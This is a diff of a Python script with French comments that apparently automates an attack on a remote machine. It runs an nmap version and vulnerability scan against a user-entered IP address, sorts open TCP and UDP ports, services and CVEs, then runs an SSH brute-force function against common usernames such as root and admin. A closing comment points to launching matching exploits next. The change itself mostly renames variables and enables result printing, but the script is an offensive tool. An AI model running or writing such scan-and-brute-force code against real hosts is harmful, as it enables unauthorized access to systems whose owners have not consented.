@@ -10,12 +10,14 @@ subprocess.call(["python3", "dependencies.py"])
 # Demande a l'utilisateur d'entrer l'adresse IP de la machine distante
 ip_address = input("Enter the IP address to scan: ")
 
+# Fonction qui lance un scan Nmap sur la machine distante
 def run_nmap_scan(ip_address):
     # Lance un scan Nmap sur la machine distante
     output = subprocess.check_output(["nmap", "-p-", "-sV", "--script", "vulners", ip_address])
     
     # Sort les ports ouverts, les services et les CVEs
-    open_ports = []
+    open_tcp_ports = []
+    open_udp_ports = []
     services = {}
     cves = []
     
@@ -23,10 +25,10 @@ def run_nmap_scan(ip_address):
     for line in lines:
         if "open" in line and "tcp" in line:
             port = line.split("/")[0]
-            open_ports.append(port)
+            open_tcp_ports.append(port)
         elif "open" in line and "udp" in line:
             port = line.split("/")[0]
-            open_ports.append(port)
+            open_udp_ports.append(port)
         elif "Service Info" in line:
             service = line.split(":")[1].strip()
             services[port] = service
@@ -34,19 +36,18 @@ def run_nmap_scan(ip_address):
             cve = line.split(":")[1].strip()
             cves.append(cve)
     
-    return open_ports, services, cves
+    return open_tcp_ports, open_udp_ports, services, cves
 
-# Perform the Nmap scan
-#open_ports, services, cves = run_nmap_scan(ip_address)
+# Execute la fonction run_nmap_scan avec l'adresse IP fournie
+open_tcp_ports, open_udp_ports, services, cves = run_nmap_scan(ip_address)
 
 # Affiche les résultats du scan a l'écran
-#print("Open ports:", open_ports)
-#print("Services:", services)
-#print("CVEs:", cves)
-
+print("Open TCP ports:", open_tcp_ports)
+print("Open UDP ports:", open_udp_ports)
+print("Services:", services)
+print("CVEs:", cves)
 
 # Effectue un bruteforce sur le service SSH
-
 def brute_force_ssh(ip):
     usernames = ["debian", "root", "user", "admin"]
     
@@ -67,7 +68,7 @@ def brute_force_ssh(ip):
     
     print("Attack unsuccessful")
 
-# Call the brute_force_ssh function with the provided IP address
+# Appelle la fonction brute_force_ssh avec l'adresse IP fournie
 brute_force_ssh(ip_address)
 
 #appel des exploits compatibles
